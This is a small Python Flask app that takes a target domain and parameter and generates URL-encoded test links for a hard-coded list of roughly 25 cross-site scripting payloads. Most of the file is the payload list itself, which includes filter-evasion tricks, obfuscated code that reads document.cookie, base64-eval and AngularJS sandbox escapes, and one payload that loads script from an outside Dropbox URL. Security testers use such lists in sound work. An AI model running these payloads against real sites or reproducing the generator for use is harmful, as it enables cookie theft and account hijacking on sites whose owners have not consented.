# File: app.py

from flask import Flask, render_template, request
import urllib.parse

app = Flask(__name__)

# Define the expanded list of XSS payloads
XSS_PAYLOADS = [
    '<img src=123>',
    '<a href="javascript:alert(document.domain)">xss</a>',
    '<svg></svg><img src=1>',
    r'\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e',
    '<script /***/>/***/confirm(document.cookie,document.domain)/***/</script /***/',
    '</title/\'/</style/</script/--><p" onclick=alert()//>*/alert()/*',
    '<svg><script x:href="https://dl.dropbox.com/u/13018058/js.js">',
    '<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(document.domain,document.cookie)&NewLine;>X</a>',
    '<iframe onload="javascript:prompt(document.domain)" id="hello" role="world">',
    '‘>alert(154)<​/script><​script/154=’;;;;;;;',
    '"><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d\'block\'...',
    'returnuri=%09Jav%09ascript:alert(document.domain)',
    '<iframe src=%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">',
    r'<script %20~~~>\u0061\u006C\u0065\u0072\u0074(\'XSS\')</script %20~~~>',
    '<x/onpointerRawupdate=confirm%26Ipar;1)//x',
    '<svg/onload=eval(atob("YWxlcnQoJ1hTUycp"))>',
    r'"<b onmouseover=alert(\'Wufff!\')>click me!</b>',
    '"><script>alert(document.cookie)</script>',
    '"><body/oNpagEshoW=(confirm)(document.domain)>',
    '<img/src/onerror=alert&#xFEFF;(1)>',
    '<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`1` //',
    '<noscript><p title="</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()">',
    '<svg/oNlY=1 ONlOAD=confirm(document.domain)>',
    '<iframe src="javascript​:alert(\'hacked\');"></IFRAME>',
    '<div ng-app> <strong class="ng-init:constructor.constructor(\'alert(\'hacked\')\')()">aaa</strong> </div>',
    # Add more from the provided list as needed to reach 50+ payloads
]

@app.route('/', methods=['GET', 'POST'])
def index():
    urls_with_payloads = []
    if request.method == 'POST':
        domain = request.form.get('domain', '').strip()
        param = request.form.get('param', '').strip()

        if domain and param:
            for payload in XSS_PAYLOADS:
                encoded_payload = urllib.parse.quote(payload)
                test_url = f"{domain}?{param}={encoded_payload}"
                urls_with_payloads.append(test_url)

    return render_template('index.html', urls_with_payloads=urls_with_payloads)

if __name__ == '__main__':
    app.run(debug=True)
